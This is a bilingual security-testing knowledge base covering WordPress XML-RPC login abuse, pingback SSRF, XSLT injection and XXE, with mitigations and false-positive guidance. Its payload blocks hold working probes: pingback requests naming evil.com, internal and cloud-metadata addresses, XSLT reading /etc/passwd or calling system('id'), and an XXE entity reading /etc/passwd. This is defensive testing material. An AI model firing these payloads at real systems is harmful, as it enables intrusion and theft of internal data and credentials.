title.zh: 验证一个只读认证边界

description.zh: 对一个无状态只读方法比较匿名和授权测试账号响应，不执行内容修改或批量操作。
description.en: Compare anonymous and authorized test-account responses for one stateless read-only method without modifying content or running bulk operations.

title.zh: 最小化方法面并复测
title.en: Minimize the method surface and retest

description.zh: 关闭不需要的方法、设置调用限制后重新枚举，确认仅保留批准的业务能力。
description.en: Disable unnecessary methods, set call limits, and enumerate again to confirm that only approved business capabilities remain.

review.rationale: 该条是 XML-RPC 协议请求体，不是工具命令；应从 SSTI 改到 WordPress XML-RPC。

prerequisites.zh: 目标 WordPress XML-RPC endpoint 已确认启用，测试来源获授权，并能区分 system.* introspection 与业务方法。
prerequisites.en: The target WordPress XML-RPC endpoint is confirmed enabled and authorized for testing, with system introspection methods distinguished from business methods.

prerequisites.zh: 使用单次低速请求和最低权限测试账户，保存 methodResponse/faultCode、插件配置、认证状态和服务器方法调用审计。
prerequisites.en: Single low-rate requests and a least-privilege test account preserve methodResponse or faultCode, plugin configuration, authentication state, and server-side method-call audit.

analysis.zh: 阳性证据首先是 system.listMethods 等由目标 endpoint 实际响应；风险结论还需证明公开了非预期方法或未授权测试方法可调用，不能只凭端点存在。 假阳性边界：xmlrpc.php 返回 200/405、WordPress 指纹、通用 XML fault、方法列表只含预期公开项、WAF 模拟响应或 endpoint 强制认证都不是漏洞。
analysis.en: Positive evidence first requires the target endpoint to actually answer system.listMethods or related calls; a risk finding additionally needs unexpected method exposure or unauthorized invocation of a test method, not endpoint existence alone. False-positive boundary: An HTTP 200 or 405 from xmlrpc.php, WordPress fingerprinting, a generic XML fault, an expected public-only method list, a WAF-generated response, or enforced authentication does not prove a vulnerability.

opsecTips.zh: XML-RPC 枚举只调用少量 system.* 方法，不执行 multicall 放大或业务写方法；出现速率限制、真实内容变化、登录尝试或服务延迟时停止。
opsecTips.en: XML-RPC enumeration calls a small set of system methods only and never amplification multicalls or business writes; stop on rate limiting, real content changes, login attempts, or service latency.

opsecTips.zh: 关闭测试会话，删除 method 审计和临时响应，恢复 XML-RPC/插件最小化配置并重放允许与禁止方法基线。
opsecTips.en: Close test sessions, delete method audit and temporary responses, restore minimized XML-RPC and plugin configuration, and replay allowed and denied method baselines.

name.zh: WordPress XML-RPC 认证重试与批量滥用
name.en: WordPress XML-RPC Authentication Retry and Batch Abuse

description.zh: 验证 XML-RPC 登录方法是否绕过统一登录锁定、速率限制或通过批量调用放大认证尝试。
description.en: Verifies whether XML-RPC login methods bypass centralized lockout and rate limits or amplify authentication attempts through batching.

overview.zh: 该条关注 XML-RPC 登录方法是否与网页登录共享失败计数、账号锁定、验证码和速率限制。它不是密码字典本身的质量展示；应使用专用测试账号和极低次数验证控制一致性，避免对真实账号进行批量尝试。
overview.en: This entry evaluates whether XML-RPC login methods share failure counters, lockout, CAPTCHA, and rate limits with web login. It is not a password-list showcase. Use a dedicated test account and very few attempts to verify control consistency without bulk attempts against real accounts.

vulnerability.zh: 根因通常是 XML-RPC 认证走独立代码路径，未接入统一风控，或 multicall 把多次认证封装进单个 HTTP 请求而计数器只按请求计数。单个错误密码返回标准 faultCode 属于正常功能，只有限制明显不一致或批量放大成功才构成问题。
vulnerability.en: The root cause is usually an XML-RPC authentication path outside centralized risk controls, or multicall packaging many attempts into one HTTP request while counters track requests only. A standard faultCode for one wrong password is normal; the issue requires inconsistent limits or successful amplification.

exploitation.zh: 1. 为专用测试账号记录网页登录的失败阈值和冷却时间；2. 以现有 XML-RPC 请求进行不超过批准次数的错误认证并记录 faultCode、Retry-After 和账号状态；3. 在测试环境检查 multicall 是否按内部调用计数。观察证据是 XML-RPC 可继续尝试而网页已限速，或批量调用未逐项计数；普通失败响应和不同错误文案属于假阳性。
exploitation.en: 1. Record the web-login failure threshold and cooldown for a dedicated test account. 2. Use the existing XML-RPC request for no more than the approved number of failed authentications and record faultCode, Retry-After, and account state. 3. In a test environment, check whether multicall counts each internal call. Evidence is continued XML-RPC attempts after web login is limited or missing per-call counting; normal failures and different wording are false positives.

mitigation.zh: 1. 将网页、API 和 XML-RPC 接入统一账号级与来源级速率限制；2. 对 multicall 按内部调用计数并设置最大子调用数；3. 为高风险登录启用 MFA、强密码和渐进延迟，避免仅依赖 IP；4. 记录方法名、账号、失败原因和批量大小并对跨通道异常建立告警。
mitigation.en: 1. Apply centralized account- and source-level rate limits across web, API, and XML-RPC. 2. Count each multicall subrequest and cap batch size. 3. Use MFA, strong passwords, and progressive delay for high-risk login rather than relying on IP alone. 4. Log method, account, failure reason, and batch size and alert on cross-channel anomalies.

title.zh: 建立网页登录限制基线

description.zh: 使用专用账号记录网页端失败计数、锁定、冷却和响应头，固定测试次数上限。
description.en: Use a dedicated account to record web failure counters, lockout, cooldown, and response headers and fix a maximum test-attempt count.

title.zh: 执行受限 XML-RPC 对照

description.zh: 在批准次数内提交现有 XML-RPC 认证请求，逐次记录 faultCode、耗时、账号状态和限速信号。
description.en: Within the approved attempt count, submit the existing XML-RPC authentication request and record faultCode, timing, account state, and rate-limit signals for each attempt.

title.zh: 检查批量调用计数

description.zh: 仅在测试环境以小批量确认 multicall 是否按子调用累计失败次数，并与单请求结果比较。
description.en: Only in a test environment, use a small batch to confirm whether multicall counts every subcall and compare it with single-call behavior.

title.zh: 统一风控后回归

description.zh: 将 XML-RPC 纳入统一限速与锁定后重复同样少量尝试，确认各通道阈值一致且正常客户端可用。
description.en: After integrating XML-RPC with centralized limits and lockout, repeat the same small test to confirm consistent thresholds and normal client operation.

review.rationale: 内容是 XML-RPC 登录请求体，应归入认证控制验证 Payload，而不是 SSTI。

prerequisites.zh: WordPress XML-RPC 登录方法在授权测试实例可用，统一登录锁定/速率限制、应用密码和 system.multicall 行为已记录。
prerequisites.en: WordPress XML-RPC login methods are available on an authorized test instance, with unified login lockout or rate limiting, application passwords, and system.multicall behavior recorded.

prerequisites.zh: 只使用专用测试账户与少量明确错误密码，监控 XML-RPC、wp-login、WAF 和账户锁定计数，不使用默认/真实凭据字典。
prerequisites.en: A dedicated test account and a few explicit wrong passwords are used while XML-RPC, wp-login, WAF, and lockout counters are monitored, without default or real credential dictionaries.

analysis.zh: 阳性证据是相同测试账户的 XML-RPC 失败尝试未计入统一限制，或单个 multicall 实际执行多次认证并超过预期阈值，服务端审计可计数。 假阳性边界：不同错误消息、XML-RPC 返回 fault、单次登录方法可用、WAF 允许请求、测试账户未锁但尚未达到阈值或客户端发送多请求均不是放大/绕过。
analysis.en: Positive evidence requires failed XML-RPC attempts for the same test account to evade unified controls, or one multicall to execute multiple authentications beyond the intended threshold, countable in server audit. False-positive boundary: Different error text, an XML-RPC fault, availability of one login method, WAF allowance, no lockout before the threshold, or multiple client requests does not prove amplification or bypass.

opsecTips.zh: 认证重试测试严格限制次数并只用测试账户；出现真实账户、成功登录、锁定、通知邮件、自动封禁、服务压力或并发放大时停止。
opsecTips.en: Authentication-retry testing strictly limits attempts and uses a test account only; stop on real accounts, successful login, lockout, notification email, automatic blocking, service pressure, or concurrent amplification.

opsecTips.zh: 重置/删除测试账户与锁定计数，吊销测试会话/应用密码，清理 XML-RPC/WAF 日志和队列邮件，恢复速率限制配置。
opsecTips.en: Reset or delete the test account and lockout counters, revoke test sessions and application passwords, clear XML-RPC and WAF logs plus queued mail, and restore rate-limit configuration.

name.zh: WordPress XML-RPC Pingback 回调验证

description.zh: 验证 pingback.ping 是否会由服务器访问提交的来源 URL，并评估目标约束、重定向和出站策略。
description.en: Verifies whether pingback.ping causes the server to fetch a supplied source URL and evaluates target validation, redirects, and egress policy.

overview.zh: WordPress pingback 的合法用途是让站点验证其他页面对本文章的链接，因此服务端会读取来源 URL。安全评估应确认该功能是否启用、来源与目标如何校验、是否跟随重定向以及请求从何处发出；一次正常外部回调不等于可访问内网。
overview.en: WordPress pingback legitimately lets a site verify that another page links to an article, so the server fetches the source URL. Assessment should determine whether the feature is enabled, how source and target are validated, whether redirects are followed, and where requests originate. One normal external callback does not prove internal access.

vulnerability.zh: 根因是 pingback.ping 接受可控 URL 并由服务器发起请求，但缺少协议、最终地址、DNS 解析和网络范围限制。功能成功与 SSRF 影响需要分开：只有攻击者能让请求越过预期出站边界或访问受限目标时才构成安全问题。
vulnerability.en: The root cause is a controllable URL fetched by the server without sufficient restrictions on scheme, final address, DNS resolution, and network range. Functional success and SSRF impact are separate; the security issue requires crossing the intended egress boundary or reaching a restricted target.

exploitation.zh: 1. 在授权域准备返回唯一随机标记且不重定向的页面；2. 提交现有 pingback 请求并关联应用日志、来源 IP 和目标文章；3. 在测试网络增加一次受控重定向和一个不可达地址，比较校验阶段。观察证据是服务器按预期任务发出可关联请求；浏览器访问、搜索爬虫或其他后台任务的请求属于假阳性。
exploitation.en: 1. Prepare an authorized page that returns a unique random marker without redirecting. 2. Submit the existing pingback request and correlate application logs, source IP, and target article. 3. In a test network, add one controlled redirect and one unreachable address to compare validation stages. Evidence is a correlatable server request from the pingback task; browser visits, search crawlers, and unrelated jobs are false positives.

mitigation.zh: 1. 不需要 pingback 时在 WordPress 配置中关闭；2. 必须保留时只允许 HTTP/HTTPS，并在 DNS 解析后及每次重定向后阻止本地、私网、链路本地和保留地址；3. 使用出站代理和网络 ACL 限制目标端口与网段；4. 记录来源 URL、最终 IP、重定向链和调用主体并限制频率。
mitigation.en: 1. Disable pingback in WordPress when it is unnecessary. 2. If retained, allow only HTTP and HTTPS and block loopback, private, link-local, and reserved ranges after DNS resolution and every redirect. 3. Use an egress proxy and network ACLs to restrict destination ports and ranges. 4. Log source URL, final IP, redirect chain, and principal and enforce rate limits.

title.zh: 准备唯一外部回调标记
title.en: Prepare a unique external callback marker

description.zh: 在授权服务器创建一次性路径并记录请求头、来源 IP 和时间窗，避免与其他流量混淆。
description.en: Create a one-time path on an authorized server and record headers, source IP, and time window to avoid confusion with unrelated traffic.

title.zh: 触发 pingback.ping

description.zh: 提交现有 pingback XML 请求并记录 XML-RPC faultCode、目标文章和服务端任务日志。
description.en: Submit the existing pingback XML request and record the XML-RPC faultCode, target article, and server job logs.

attackChain.payload:
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://evil.com</string></value></param><param><value><string>https://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://evil.com/</string></value></param><param><value><string>https://target.com/</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com/</string></value></param><param><value><string>http://target.com/</string></value></param></params></methodCall>

title.zh: 验证重定向与地址策略

description.zh: 在测试网络用单次受控重定向和不可达地址比较最终 IP 校验，禁止触碰真实内网或元数据服务。
description.en: In a test network, compare final-IP validation with one controlled redirect and an unreachable address without touching real internal or metadata services.

title.zh: 关闭或限制 Pingback 后复测
title.en: Retest after disabling or restricting pingback

description.zh: 应用功能开关、最终地址校验和出站 ACL 后重复外部样例，确认策略符合业务预期。
description.en: Apply the feature toggle, final-address validation, and egress ACLs, then repeat the external sample to confirm policy matches business requirements.

review.rationale: 该条是触发服务器回调的 XML-RPC 请求体，应从 SSTI 改归 SSRF Payload。

prerequisites.zh: WordPress pingback.ping 在授权站点启用，来源/目标 URL 参数语义、站点文章引用要求和出站网络路径已确认。
prerequisites.en: WordPress pingback.ping is enabled on an authorized site, with source and target URL semantics, post-link requirements, and egress path confirmed.

prerequisites.zh: evil/target 域全部替换为自有空页面和唯一令牌，来源页包含合法测试链接，并记录 XML-RPC fault、DNS/HTTP 与 WordPress 请求 ID。
prerequisites.en: All evil and target domains are replaced by owned empty pages and unique tokens, the source page contains a legitimate test link, and XML-RPC faults, DNS or HTTP, and WordPress request identifiers are recorded.

analysis.zh: 阳性证据是 WordPress 处理特定 pingback.ping 后由应用服务器访问自有来源 URL，令牌、源 IP、User-Agent、时间和 XML-RPC 请求相互对应。 假阳性边界：测试人员浏览器/扫描器请求来源页、DNS 预解析、fault 表示方法存在、目标文章被客户端访问、反向代理探测或未关联回调均不是服务端 Pingback。
analysis.en: Positive evidence requires WordPress to process the specific pingback.ping and have the application server visit the owned source URL, correlating token, source IP, user agent, time, and XML-RPC request. False-positive boundary: Source-page requests from the tester or scanners, DNS pre-resolution, a fault showing method existence, client access to the target post, proxy probes, or uncorrelated callbacks does not prove server-side Pingback.

opsecTips.zh: Pingback 回调只访问自有空页面一次，禁止重定向、公共站点和大响应；出现重复请求、第三方 IP、真实评论/通知或出站策略异常时停止。
opsecTips.en: Pingback callback visits an owned empty page once and forbids redirects, public sites, and large responses; stop on repeated requests, third-party IPs, real comments or notifications, or egress-policy anomalies.

opsecTips.zh: 删除测试来源/目标文章和 pingback 记录，关闭监听端点，清理 DNS/HTTP/XML-RPC 日志与缓存，并恢复 Pingback 配置。
opsecTips.en: Delete test source and target posts plus pingback records, close listener endpoints, clear DNS, HTTP, XML-RPC logs and caches, and restore Pingback configuration.

name.zh: WordPress XML-RPC Pingback 内部目标 SSRF
name.en: WordPress XML-RPC Pingback SSRF to Restricted Targets

description.zh: 评估 pingback.ping 对回环、私网、链路本地和重定向后目标的限制是否覆盖最终解析地址。
description.en: Evaluates whether pingback.ping blocks loopback, private, link-local, and post-redirect destinations based on the final resolved address.

overview.zh: 该条在已确认服务器会执行 pingback 请求后，进一步验证目标地址控制。重点是 URL 解析、DNS 结果、IPv4/IPv6 归一化和重定向后的最终地址，而不是枚举真实内网；应在隔离网络用自建私网服务和不可达保留地址完成验证。
overview.en: After confirming server-side pingback requests, this entry evaluates destination controls. The focus is URL parsing, DNS results, IPv4 and IPv6 normalization, and the final address after redirects, not real internal enumeration. Use a self-owned private service and unreachable reserved addresses in an isolated network.

vulnerability.zh: 根因是过滤器只检查原始字符串或首个主机名，却未在解析、连接和重定向阶段统一验证最终 IP，导致回环、私网或链路本地地址可达。不同状态码和时延只能作为线索；必须有受控内部服务日志或网关连接记录才能确认跨越网络边界。
vulnerability.en: The root cause is validating only the original string or first hostname instead of the final IP at resolution, connection, and redirect stages, allowing loopback, private, or link-local destinations. Status and timing differences are clues only; confirmation requires logs from a controlled internal service or egress gateway.

exploitation.zh: 1. 在隔离测试网部署只返回随机标记的内部服务并记录来源；2. 提交现有回环、私网和 IPv6 形式请求，逐个记录 faultCode、时间和网关日志；3. 加入公开地址、不可达地址和一次受控重定向作对照。观察证据是 pingback 任务连接到自建内部服务；单纯超时、连接拒绝或响应差异属于假阳性。
exploitation.en: 1. Deploy a controlled internal service in an isolated test network that returns a random marker and logs the source. 2. Submit the existing loopback, private, and IPv6 forms individually and record faultCode, timing, and gateway logs. 3. Add public, unreachable, and one controlled redirect case as controls. Evidence is a pingback job connection to the controlled internal service; timeout, refusal, or response differences alone are false positives.

mitigation.zh: 1. 统一 URL 解析并仅允许明确协议和端口；2. 在 DNS 解析后、连接前和每次重定向后拒绝回环、私网、链路本地、组播及保留地址；3. 通过出站代理、DNS 策略和网络 ACL 实施第二层阻断；4. 记录原始 URL、规范化主机、所有解析 IP 和最终连接并建立回归矩阵。
mitigation.en: 1. Canonicalize URLs and allow only explicit schemes and ports. 2. Reject loopback, private, link-local, multicast, and reserved addresses after DNS resolution, before connection, and after every redirect. 3. Add defense in depth with an egress proxy, DNS policy, and network ACLs. 4. Log the original URL, canonical host, all resolved IPs, and final connection and maintain a regression matrix.

title.zh: 部署隔离内部证据端点
title.en: Deploy an isolated internal evidence endpoint

description.zh: 在专用测试网启动只记录请求并返回唯一标记的服务，确保不会访问生产内网或云元数据。
description.en: Start a request-logging service that returns a unique marker in a dedicated test network, ensuring no production internal or cloud metadata endpoint is contacted.

title.zh: 逐种地址提交 Pingback
title.en: Submit pingback for each address form

description.zh: 逐一运行现有 XML-RPC SSRF 输入，分别记录回环、IPv6、私网和链路本地形式的处理结果。
description.en: Run each existing XML-RPC SSRF input separately and record handling of loopback, IPv6, private, and link-local forms.

attackChain.payload:
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://127.0.0.1</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://localhost</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://0.0.0.0</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://[::1]</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://169.254.169.254</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://192.168.0.1</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://192.168.1.1</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://10.0.0.1</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://172.16.0.1</string></value></param><param><value><string>http://target.com</string></value></param></params></methodCall>

title.zh: 以服务与网关日志确认
title.en: Confirm with service and gateway logs

description.zh: 只有内部证据端点或出站网关出现同一任务标记才确认可达，状态码和时延仅作辅助。
description.en: Confirm reachability only when the internal evidence endpoint or egress gateway records the same task marker; status and timing are supporting data only.

title.zh: 验证最终地址阻断

description.zh: 实施规范化、DNS 后校验和重定向后校验，再运行全部地址变体确认均被一致拒绝。
description.en: Apply canonicalization, post-DNS validation, and post-redirect validation, then rerun all address forms to confirm consistent rejection.

review.rationale: 该条是内部目标形式的 XML-RPC 请求体，属于 SSRF Payload。

prerequisites.zh: 已先用自有外部 endpoint 确认 pingback.ping 的服务端请求原语，并能观察 URL 解析、DNS、重定向和最终连接 IP。
prerequisites.en: A server-side pingback request primitive is first confirmed with an owned external endpoint, and URL parsing, DNS, redirects, and final destination IP are observable.

prerequisites.zh: 内部验证只指向隔离回环监听器和专用 marker 路径，禁止云元数据/真实私网；每种地址表示使用唯一请求令牌。
prerequisites.en: Internal validation targets only an isolated loopback listener and dedicated marker path, forbidding cloud metadata and real private networks, with a unique request token per address form.

analysis.zh: 阳性证据是 WordPress 应用进程因特定 XML-RPC 请求连接隔离内部监听器并发送令牌化 HTTP 请求，解析后 IP、连接源与请求 ID 对应。 假阳性边界：URL 参数被接受、DNS 查询、外部回调成功、客户端访问 127.0.0.1、0.0.0.0 解析差异、连接拒绝或只返回 Pingback fault 均不能证明内部 SSRF。
analysis.en: Positive evidence requires the WordPress application process to connect to the isolated internal listener because of the specific XML-RPC request and send a tokenized HTTP request, correlating resolved IP, connection source, and request identifier. False-positive boundary: Accepted URL input, DNS queries, successful external callback, client access to loopback, parser differences for 0.0.0.0, connection refusal, or a Pingback fault alone does not prove internal SSRF.

opsecTips.zh: Pingback SSRF 禁止 169.254.169.254、真实内网服务和重定向链；出现非隔离 IP、认证头、响应数据、端口扩散或请求风暴时停止。
opsecTips.en: Pingback SSRF forbids metadata addresses, real internal services, and redirect chains; stop on a nonisolated IP, authentication headers, response data, port expansion, or request storms.

opsecTips.zh: 关闭内部/外部监听器，删除测试文章、令牌和 pingback 记录，清理 DNS/代理/XML-RPC 日志，恢复出站 ACL 和 URL 校验。
opsecTips.en: Close internal and external listeners, delete test posts, tokens, and pingback records, clear DNS, proxy, and XML-RPC logs, and restore egress ACLs and URL validation.

name.zh: 服务端 XSLT 样式表注入

description.zh: 验证用户可控 XSLT 是否能调用 document()、扩展函数或处理器特有能力读取资源或执行越界操作。
description.en: Verifies whether controllable XSLT can invoke document(), extension functions, or processor-specific capabilities to access resources or exceed the intended transform boundary.

overview.zh: XSLT 注入发生在服务端允许不可信主体提供或修改样式表，而转换器又开放 document()、脚本、扩展函数或文件/网络访问。它与普通 XML 数据注入和 SSTI 不同，核心边界是“谁控制样式表代码”以及具体 XSLT 处理器允许哪些扩展。
overview.en: XSLT injection occurs when an untrusted party can provide or modify a stylesheet and the transformer permits document(), scripts, extension functions, or file and network access. It differs from ordinary XML data injection and SSTI; the core questions are who controls stylesheet code and which processor extensions are enabled.

vulnerability.zh: 根因是应用把 XSLT 当作数据接受或动态拼接 XPath/XSL 指令，同时未使用安全处理模式和资源解析器。libxslt、Saxon、Xalan 及 PHP/Java 扩展函数支持不同，某语法报错或不被支持不能证明安全，也不能由另一个处理器的能力推断当前环境。
vulnerability.en: The root cause is accepting XSLT as data or dynamically composing XPath or XSL instructions without secure-processing mode and a restrictive resource resolver. libxslt, Saxon, Xalan, and PHP or Java extensions differ, so unsupported syntax neither proves safety nor transfers capabilities from another processor.

exploitation.zh: 1. 确认业务是否允许上传样式表或控制 XPath/XSL 片段，并记录处理器和版本；2. 先用常量变换验证样式表确实受控，再在隔离环境运行现有 document()/扩展函数样例；3. 以禁用外部资源和不存在 URI 的配置作对照。观察证据是受控资源进入转换输出或扩展函数被明确执行；普通转换错误、XML 回显和不支持函数属于假阳性。
exploitation.en: 1. Determine whether the application allows stylesheet upload or control of XPath or XSL fragments and record the processor and version. 2. Confirm stylesheet control with a constant transform, then run the existing document() and extension-function sample in isolation. 3. Compare with external access disabled and a missing URI. A controlled resource in transform output or explicit extension-function execution is evidence; generic transform errors, XML reflection, and unsupported functions are false positives.

mitigation.zh: 1. 只允许服务端固定、签名或版本控制的 XSLT；2. 启用处理器安全模式并禁用脚本、扩展函数、document() 及外部 DTD/schema；3. 使用拒绝所有外部 URI 的 resolver，并将转换进程置于无网络、低权限沙箱；4. 记录样式表哈希、处理器错误和资源访问并建立各处理器回归测试。
mitigation.en: 1. Allow only fixed, signed, or version-controlled server-side XSLT. 2. Enable secure processing and disable scripts, extension functions, document(), and external DTDs or schemas. 3. Use a resolver that rejects all external URIs and run transforms in a low-privilege, no-network sandbox. 4. Log stylesheet hashes, processor errors, and resource access and maintain processor-specific regression tests.

title.zh: 识别 XSLT 处理器与输入边界
title.en: Identify the XSLT processor and input boundary

description.zh: 确认用户能控制完整样式表还是局部 XPath，并记录 libxslt、Saxon、Xalan 等具体实现和版本。
description.en: Determine whether the user controls a complete stylesheet or an XPath fragment and record the specific libxslt, Saxon, Xalan, or other implementation and version.

title.zh: 执行处理器适配样例

description.zh: 在隔离转换任务中提交现有 XSLT 集合，分别记录 document() 和扩展函数的支持、拒绝或错误。
description.en: Submit the existing XSLT set to an isolated transform job and record support, denial, or errors for document() and extension functions.

attackChain.payload:
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
<xsl:value-of select="system('id')"/>
<xsl:value-of select="php:function('system','id')"/>

title.zh: 关联资源访问与转换输出
title.en: Correlate resource access and transform output

description.zh: 用唯一资源标记、resolver 日志和转换结果确认越界访问，排除普通 XPath 错误和 XML 原样输出。
description.en: Use a unique resource marker, resolver logs, and transform output to confirm boundary crossing while excluding ordinary XPath errors and literal XML output.

title.zh: 锁定样式表来源后回归

description.zh: 改为固定样式表、拒绝外部 URI 和扩展函数后重复转换，确认正常业务输出保持一致。
description.en: Move to fixed stylesheets, reject external URIs and extension functions, and repeat the transform to confirm normal business output remains consistent.

review.rationale: 前五行构成单一完整的 XSLT document() 样式表；末两行是脱离 template 的顶层 value-of，且 system/php:function 没有可解析扩展声明，必须退役。
lineDisposition: line 5 -> retire: top-level unnamespaced system() fragment outside a template
line 6 -> retire: top-level php:function fragment without namespace declaration or template

prerequisites.zh: 用户可控 XSLT 样式表进入服务端 Transformer，处理器类型/版本、document()、URIResolver 和扩展函数策略已确认。
prerequisites.en: A user-controlled XSLT stylesheet reaches a server-side Transformer, with processor type and version, document(), URIResolver, and extension-function policy confirmed.

prerequisites.zh: 样式表只读取自有内存/沙箱 marker XML 并调用无害测试扩展函数，记录 stylesheet hash、transform 调用栈、resolver 请求和输出。
prerequisites.en: The stylesheet reads only an owned in-memory or sandbox marker XML and calls a harmless test extension function, recording stylesheet hash, transform stack, resolver requests, and output.

analysis.zh: 阳性证据是目标 XSLT 处理器执行可控 stylesheet，并通过 document()/resolver 或测试扩展函数访问预期外资源产生 marker 输出。 假阳性边界：XSLT 语法被解析、普通 value-of 工作、document('/etc/passwd') 被当 URI 失败、扩展函数禁用、路径出现在错误或客户端转换成功均不是越界。
analysis.en: Positive evidence requires the target XSLT processor to execute the controlled stylesheet and use document(), a resolver, or a test extension function to access the designated external resource and produce marker output. False-positive boundary: Parsed XSLT syntax, normal value-of behavior, URI failure for document('/etc/passwd'), disabled extensions, paths in errors, or successful client-side transformation does not prove boundary escape.

opsecTips.zh: XSLT 测试只访问沙箱 marker，不读取系统文件或公共 URL；出现真实文件/网络访问、递归 transform、CPU/内存增长、文件写入或进程时停止。
opsecTips.en: XSLT testing accesses sandbox markers only and never system files or public URLs; stop on real file or network access, recursive transforms, CPU or memory growth, file writes, or processes.

opsecTips.zh: 删除样式表、源 XML、marker 和转换产物，撤销测试 URIResolver/扩展函数，清理 transform 缓存并重启处理 worker。
opsecTips.en: Delete stylesheets, source XML, markers, and transform artifacts, remove test URI resolvers and extension functions, clear transform caches, and restart processing workers.

name.zh: XXE 参数实体与内部 DTD 注入
name.en: XXE Parameter Entity and Internal DTD Injection

description.zh: 验证 XML 解析器是否展开参数实体并将其带入后续实体声明，从而越过预期的 XML 数据边界。
description.en: Verifies whether an XML parser expands parameter entities into later declarations and crosses the intended XML data boundary.

overview.zh: 参数实体只在 DTD 中使用，常用于组合外部 DTD、普通实体或错误链。该条用于确认解析器是否接受 DTD、是否展开 `%name;` 以及展开结果能否影响文档内容；它不是简单的 XML 标签注入，也不应仅凭 DOCTYPE 被接受确认 XXE。
overview.en: Parameter entities are used inside DTDs and often compose external DTDs, general entities, or error chains. This entry determines whether the parser accepts DTDs, expands `%name;`, and lets the expansion affect document content. It is not ordinary XML tag injection, and acceptance of a DOCTYPE alone does not prove XXE.

vulnerability.zh: 根因是解析器允许 DTD 和参数实体，并且实体解析器可访问本地或远程资源。部分库会允许内部 DTD 但禁止外部实体，部分会延迟到验证阶段；因此需要通过受控标记、解析日志和对照文档确认具体能力，而不是依赖通用报错。
vulnerability.en: The root cause is a parser that permits DTDs and parameter entities while its resolver can access local or remote resources. Some libraries allow internal DTDs but block external entities, while others defer resolution until validation. Controlled markers, parser logs, and control documents are required instead of generic errors.

exploitation.zh: 1. 提交不含外部资源的内部参数实体，确认 DTD 和 `%name;` 是否被解析；2. 在隔离环境运行现有参数实体样例并记录实体声明、输出和解析日志；3. 使用禁用 DTD、未声明实体和不存在资源作为对照。观察证据是参数实体展开后的唯一标记进入文档结果；单纯“实体未定义”或 XML 格式错误属于假阳性。
exploitation.en: 1. Submit an internal parameter entity without external resources to determine whether DTD and `%name;` are parsed. 2. Run the existing parameter-entity sample in isolation and record declarations, output, and parser logs. 3. Compare DTD-disabled, undeclared-entity, and missing-resource cases. Evidence is a unique marker from parameter-entity expansion in the document result; undefined-entity and XML format errors are false positives.

mitigation.zh: 1. 在解析器工厂层禁用 DOCTYPE、外部通用实体和外部参数实体；2. 提供拒绝所有外部标识符的 EntityResolver；3. 不对不可信 XML 启用 DTD 验证，限制输入大小和实体展开量；4. 对 DOCTYPE、ENTITY 和异常展开建立日志、告警及单元回归。
mitigation.en: 1. Disable DOCTYPE declarations, external general entities, and external parameter entities at the parser-factory layer. 2. Provide an EntityResolver that rejects every external identifier. 3. Do not enable DTD validation for untrusted XML and limit input size and entity expansion. 4. Log and alert on DOCTYPE, ENTITY, and abnormal expansion and add unit regression cases.

title.zh: 确认 DTD 与参数实体支持

description.zh: 使用无外部资源的最小 DTD 判断解析器是否处理参数实体，并记录解析器实现与配置。
description.en: Use a minimal DTD without external resources to determine whether the parser processes parameter entities and record its implementation and configuration.

title.zh: 运行参数实体组合样例

description.zh: 在隔离解析器中提交现有实体声明集合，观察参数实体是否进入后续声明和文档输出。
description.en: Submit the existing declaration set to an isolated parser and observe whether the parameter entity reaches later declarations and document output.

attackChain.payload:
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY test "%xxe;">
<data>&test;</data>

title.zh: 以未声明实体排除普通错误
title.en: Use an undeclared entity as an error control

description.zh: 比较未声明实体、禁用 DTD 和不存在资源的错误类别，只有唯一标记展开才确认能力。
description.en: Compare error classes for an undeclared entity, disabled DTD, and a missing resource; confirm capability only when the unique marker expands.

title.zh: 关闭实体能力并回归

description.zh: 在解析器工厂和 resolver 双层禁用后重放样例，确认正常 XML 可解析而参数实体被拒绝。
description.en: Disable entities at both parser-factory and resolver layers, replay the sample, and confirm normal XML parses while the parameter entity is rejected.

review.rationale: 该条是 DTD 参数实体输入，属于 XXE Payload。

prerequisites.zh: XML parser 允许内部 DTD 和参数实体，实体声明片段会被组合进同一有效文档，具体解析 API 与配置可观察。
prerequisites.en: The XML parser permits internal DTDs and parameter entities, and declaration fragments are combined into one valid document, with exact parser API and configuration observable.

prerequisites.zh: 参数实体只引用 parser 沙箱内固定 marker 或自有空 DTD，保存完整 XML、实体解析器回调、文件审计和解析结果。
